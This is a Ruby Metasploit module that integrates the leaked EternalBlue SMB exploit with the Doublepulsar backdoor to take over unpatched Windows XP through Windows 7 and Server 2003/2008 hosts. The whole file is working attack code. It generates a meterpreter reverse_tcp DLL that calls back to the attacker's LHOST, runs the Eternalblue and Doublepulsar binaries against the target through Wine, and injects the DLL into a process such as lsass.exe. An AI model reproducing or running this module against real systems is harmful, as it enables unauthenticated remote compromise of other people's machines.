require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  #include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'EternalBlue',
      'Description' => %q{
          This module exploits a vulnerability on SMBv1/SMBv2 protocols through Eternalblue. 
	  After that, doublepulsar is used to inject remotely a malicious dll (it's will generate based on your 	  payload selection).
	  You can use this module to compromise a host remotely (among the targets available) without needing   nor authentication neither target's user interaction.
          THIS MODULE WAS MODIFY FROM https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
	  ** THIS IS AN INTEGRATION OF THE ORIGINAL EXPLOIT, IT'S NOT THE FULL PORTATION **
      },
      'Author'      =>
        [
          'SUMEDT JITPUKDEBODIN'
        ],
		'Payload'        =>
        {
          'BadChars'   => "\x00\x0a\x0d",
        },
      'Platform'       => 'win',
      'DefaultTarget'  => 8,
      'Targets'        =>
        [
	  ['Windows XP (all services pack) (x86) (x64)',{}],
	  ['Windows Server 2003 SP0 (x86)',{}],
	  ['Windows Server 2003 SP1/SP2 (x86)',{}],
	  ['Windows Server 2003 (x64)',{}],
          ['Windows Vista (x86)',{}],
	  ['Windows Vista (x64)',{}],
	  ['Windows Server 2008 (x86) ',{}],
	  ['Windows Server 2008 R2 (x86) (x64)',{}],
	  ['Windows 7 (all services pack) (x86) (x64)',{}]
	],
      'Arch'           => [ARCH_X86,ARCH_X64],
	  'ExitFunc'	   => 'thread',
	  'Target'		   => 0,
      'License'     => MSF_LICENSE,
		)

		)

	register_options([
		OptEnum.new('TARGETARCHITECTURE', [true,'Target Architecture','x86',['x86','x64']]),
		OptString.new('ETERNALBLUEPATH',[true,'Path directory of Eternalblue','/root/shadowbroker/windows/lib/x86-Windows/']),
		OptString.new('DOUBLEPULSARPATH',[true,'Path directory of Doublepulsar','/root/shadowbroker/windows/lib/x86-Windows/']),
		OptString.new('WINEPATH',[true,'WINE drive_c path','/root/.wine/drive_c/']),
		OptString.new('PROCESSINJECT',[true,'Name of process to inject into (Change to lsass.exe for x64)','wlms.exe'])
	], self.class)

  register_advanced_options([
    OptInt.new('TimeOut',[false,'Timeout for blocking network calls (in seconds)',60]),
    OptString.new('DLLName',[true,'DLL name for Doublepulsar','eternal11.dll'])
  ], self.class)

  end

  def exploit
 
  #WIN72K8R2 (4-8) and XP (0-3)
  if target.name =~ /7|2008|Vista/
	objective = "WIN72K8R2"
  else
	objective = "XP"
  end

  #Generate DLL
  dllpayload = datastore['WINEPATH'] + datastore['DLLName']
  dllpayload2 = dllpayload.gsub('/','\/')
  print_status("Generating payload DLL for Doublepulsar")
  	if (datastore['TARGETARCHITECTURE'] =~ /x86/)
		pay = framework.modules.create(datastore['payload'])
  	else
		datastore['payload'] = "windows/x64/meterpreter/reverse_tcp"
		pay = framework.modules.create('windows/x64/meterpreter/reverse_tcp')
  	end
  pay.datastore['LHOST'] = datastore['LHOST']
  dll = pay.generate_simple({'Format'=>'dll'})
  File.open(datastore['WINEPATH']+datastore['DLLName'],'w') do |f|
	print_status("Writing DLL in #{dllpayload}")
	f.print dll
  end

  #Send Exploit + Payload Injection
  print_status('Launching Eternalblue...')
  output = `cd #{datastore['ETERNALBLUEPATH']}; wine Eternalblue-2.2.0.exe --TargetIp #{datastore['RHOST']}`
  if output =~ /=-=-WIN-=-=/
  	print_good("Pwned! Eternalblue success!")
  elsif output =~ /Backdoor returned code: 10 - Success!/
	print_good("Backdoor is already installed")
  else
	print_error("Are you sure it's vulnerable?")
  end
  print_status('Launching Doublepulsar...')
  output2 = `cd #{datastore['DOUBLEPULSARPATH']}; wine Doublepulsar-1.3.1.exe --TargetIp #{datastore['RHOST']} --Function RunDLL --DllPayload #{dllpayload} --ProcessName #{datastore['PROCESSINJECT']}`
  if output2 =~ /Backdoor returned code: 10 - Success!/
	print_good("Remote code executed... 3... 2... 1...")
  else
	print_error("Oops, something was wrong!")
  end  

  handler

 end

end
